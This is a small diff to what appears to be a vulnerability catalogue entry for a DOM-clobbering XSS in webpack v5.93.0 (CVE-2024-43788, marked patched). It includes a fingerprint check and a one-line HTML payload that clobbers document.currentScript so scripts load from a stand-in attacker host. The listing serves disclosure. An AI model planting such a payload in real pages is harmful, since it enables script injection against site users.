@@ -6,10 +6,10 @@
 + Stars: 64.4K
 + Version: v5.93.0
 + Fingerprint: `typeof __webpack_require__ !== 'undefined' && __webpack_require__.hasOwnProperty('p')`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
++ Payload: ```<img name="currentScript" src="https://attack.hulk"></img>```
 + Impact: XSS
 + Status: Patched
-+ CVE: CVE-2024-43788
++ CVE: [CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)
 + Foundby: TheHulk
 
 ### Library
